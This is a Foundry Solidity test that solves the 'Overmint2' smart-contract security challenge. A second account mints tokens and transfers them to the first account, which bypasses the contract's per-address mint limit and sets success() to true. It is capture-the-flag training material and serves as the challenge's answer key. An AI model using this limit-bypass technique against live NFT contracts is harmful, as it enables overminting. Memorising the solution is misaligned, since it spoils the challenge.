// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";

import {DeployOvermint2Script} from "@script/2_DeployOvermint2.s.sol";
import {Overmint2} from "@main/Overmint2.sol";

contract Overmint2Test is Test, DeployOvermint2Script {
    address public attacker = address(11);
    address public attacker2 = address(12);

    function setUp() public {
        vm.deal(attacker, 1 ether);
        vm.deal(attacker2, 1 ether);
        vm.label(attacker, "Attacker");
        vm.label(attacker2, "Attacker2");

        DeployOvermint2Script.run();
    }

    function test_isSolved() public {
        vm.startPrank(attacker);

        assertEq(overmint2Challenge.success(), false);

        overmint2Challenge.mint();
        overmint2Challenge.mint();
        overmint2Challenge.mint();
        assertEq(overmint2Challenge.balanceOf(attacker), 3);

        vm.stopPrank();
        vm.startPrank(attacker2);

        overmint2Challenge.mint();
        overmint2Challenge.mint();
        overmint2Challenge.transferFrom(attacker2, attacker, 4);
        overmint2Challenge.transferFrom(attacker2, attacker, 5);

        vm.stopPrank();

        vm.startPrank(attacker);
        assertEq(overmint2Challenge.success(), true);
        vm.stopPrank();
    }
}
